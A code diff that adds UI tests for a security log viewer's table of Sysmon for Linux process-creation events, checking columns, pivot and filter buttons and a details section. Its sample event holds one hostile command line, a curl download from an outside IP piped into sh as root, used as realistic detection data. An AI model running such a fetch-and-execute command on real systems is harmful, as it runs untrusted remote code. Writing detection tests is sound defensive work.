@@ -80,6 +80,37 @@ describe("Linux log tables: firewall", () => {
   });
 });
 
+describe("Linux log tables: Sysmon for Linux", () => {
+  const process = row("linux_syslog", {
+    event: { type: "sysmon_process_created", code: "1", severity: "info", message: "Process created: curl -s http://203.0.113.9/x | sh (parent /bin/bash)" },
+    message: "Process created: curl -s http://203.0.113.9/x | sh (parent /bin/bash)",
+    user: { name: "root" },
+    process: { name: "curl", path: "/usr/bin/curl", command_line: "curl -s http://203.0.113.9/x | sh", parent_path: "/bin/bash", parent_command_line: "bash -i", pid: 1234, ppid: 1000 },
+    linux: { sysmon_event_id: 1, exe: "/usr/bin/curl" },
+  });
+
+  it("shows the process, command line and parent instead of an XML blob", () => {
+    render(<EventTable items={[process]} view="network" />);
+    for (const name of [/^Event/, /User/, /Image/, /Command Line/, /Parent Image/, /Message/]) {
+      expect(screen.getAllByRole("columnheader", { name }).length).toBeGreaterThan(0);
+    }
+    expect(screen.getByText("Process created", { selector: "td *" })).toBeInTheDocument();
+    expect(screen.getByText("/usr/bin/curl")).toBeInTheDocument();
+    expect(screen.getByText("/bin/bash")).toBeInTheDocument();
+  });
+
+  it("opens a Sysmon event section and offers a pivot on the image", () => {
+    const onFilterField = vi.fn();
+    render(<EventTable items={[process]} view="network" onFilterField={onFilterField} />);
+    fireEvent.click(screen.getByRole("button", { name: "Pivot Image" }));
+    fireEvent.click(screen.getByRole("button", { name: "Filter by Image" }));
+    expect(onFilterField).toHaveBeenCalledWith("exe", "/usr/bin/curl");
+    fireEvent.click(screen.getByText("/bin/bash"));
+    expect(screen.getByText("Sysmon event")).toBeInTheDocument();
+    expect(screen.getByText("Parent command line")).toBeInTheDocument();
+  });
+});
+
 describe("Linux log tables: systemd journal", () => {
   const item = row("linux_journal", {
     event: { type: "linux_journal", action: "ssh.service", severity: "medium", message: "Failed password for invalid user mallory" },
